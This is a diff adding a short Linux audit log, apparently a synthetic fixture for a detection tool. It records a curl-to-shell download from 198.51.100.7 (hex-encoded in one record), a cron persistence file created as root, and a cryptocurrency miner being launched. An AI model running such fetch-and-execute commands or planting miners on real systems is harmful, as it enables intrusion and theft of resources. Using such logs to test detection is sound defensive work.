@@ -1,0 +1,18 @@
+type=SYSCALL msg=audit(1731975000.100:901): arch=c00000b7 syscall=221 success=yes exit=0 a0=55 a1=55 a2=55 a3=0 items=2 ppid=812 pid=1500 auid=1000 uid=1000 gid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key="sentinel_exec"
+type=EXECVE msg=audit(1731975000.100:901): argc=1 a0="-bash"
+type=CWD msg=audit(1731975000.100:901): cwd="/home/sam"
+type=SYSCALL msg=audit(1731975004.250:910): arch=c00000b7 syscall=221 success=yes exit=0 a0=55 a1=55 a2=55 a3=0 items=2 ppid=1500 pid=1533 auid=1000 uid=1000 gid=1000 euid=1000 comm="sh" exe="/usr/bin/dash" key="sentinel_exec"
+type=EXECVE msg=audit(1731975004.250:910): argc=3 a0="sh" a1="-c" a2=6375726C202D6673534C20687474703A2F2F3139382E35312E3130302E372F692E7368207C207368
+type=CWD msg=audit(1731975004.250:910): cwd="/home/sam"
+type=SYSCALL msg=audit(1731975004.300:911): arch=c00000b7 syscall=221 success=yes exit=0 a0=55 a1=55 a2=55 a3=0 items=2 ppid=1533 pid=1534 auid=1000 uid=1000 gid=1000 euid=1000 comm="curl" exe="/usr/bin/curl" key="sentinel_exec"
+type=EXECVE msg=audit(1731975004.300:911): argc=3 a0="curl" a1="-fsSL" a2="http://198.51.100.7/i.sh"
+type=SYSCALL msg=audit(1731975004.410:912): arch=c00000b7 syscall=203 success=no exit=-115 a0=5 a1=7ff a2=10 a3=0 items=0 ppid=1533 pid=1534 auid=1000 uid=1000 gid=1000 euid=1000 comm="curl" exe="/usr/bin/curl" key="sentinel_net"
+type=SOCKADDR msg=audit(1731975004.410:912): saddr=02000050C63364070000000000000000
+type=SYSCALL msg=audit(1731975006.000:920): arch=c00000b7 syscall=56 success=yes exit=3 a0=ffffff9c a1=55 a2=241 a3=1a4 items=2 ppid=1533 pid=1540 auid=1000 uid=0 gid=0 euid=0 comm="sh" exe="/usr/bin/dash" key="sentinel_persist"
+type=CWD msg=audit(1731975006.000:920): cwd="/etc/cron.d"
+type=PATH msg=audit(1731975006.000:920): item=0 name="/etc/cron.d/" inode=131 dev=b3:02 mode=040755 ouid=0 ogid=0 nametype=PARENT
+type=PATH msg=audit(1731975006.000:920): item=1 name="sysupdate" inode=4521 dev=b3:02 mode=0100644 ouid=0 ogid=0 nametype=CREATE
+type=SYSCALL msg=audit(1731975007.500:930): arch=c00000b7 syscall=221 success=yes exit=0 a0=55 a1=55 a2=55 a3=0 items=2 ppid=1540 pid=1551 auid=1000 uid=0 gid=0 euid=0 comm="miner" exe="/tmp/.x/miner" key="sentinel_exec"
+type=EXECVE msg=audit(1731975007.500:930): argc=3 a0="/tmp/.x/miner" a1="-o" a2="pool.example.invalid:3333"
+type=SYSCALL msg=audit(1731975008.000:931): arch=c00000b7 syscall=221 success=no exit=-2 a0=55 a1=55 a2=55 a3=0 items=1 ppid=1540 pid=1552 auid=1000 uid=0 gid=0 euid=0 comm="sh" exe="/usr/bin/dash" key="sentinel_exec"
+type=EXECVE msg=audit(1731975008.000:931): argc=1 a0="does-not-exist"
